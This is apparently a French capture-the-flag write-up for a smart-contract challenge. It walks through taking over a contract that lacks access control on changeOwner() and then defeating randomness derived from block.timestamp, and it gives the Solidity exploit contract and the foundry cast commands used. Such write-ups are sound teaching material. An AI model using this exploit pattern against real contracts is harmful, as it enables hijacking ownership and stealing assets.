# MaskedRevamp - K.L.M

Récup du bytecode du contrat pour le reverse :
`cast code $TAR -r $RPC`

Contrat vulnérable, pas de contrôle d'accès, aucune protection. On peut changer le propriétaire grâce au "changeOwner()"

Deuxième étape, utilisation de mauvais facteur d'aléatoire. On peut passer Solved() à true en utilisant block.timestamp

Exploit contrat :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solve {
    address public target;

    function setTarget(address _target) public {
        target = _target;
    }

    function part1() public {
        (bool success, ) = target.call(abi.encodeWithSignature("changeOwner()"));
        require(success, "changeOwner call failed");
    }

    function callFunction(bytes4 selector) public returns (bytes memory) {
        (bool success, bytes memory returnData) = target.call(abi.encodePacked(selector, block.timestamp));
        require(success, "Call failed");
        return returnData;
    }
}
```

Ensuite avec foundry :

```bash
cast send $ATK "setTarget(address)" $TAR -r $RPC --private-key $PK
cast send $ATK "part1()" -r $RPC --private-key $PK
cast send $ATK "callFunction(bytes4)" 0xab38a9f4 -r $RPC --private-key $PK
cast call $TAR "Solved()(bool)" -r $RPC
true
```

Win ! 

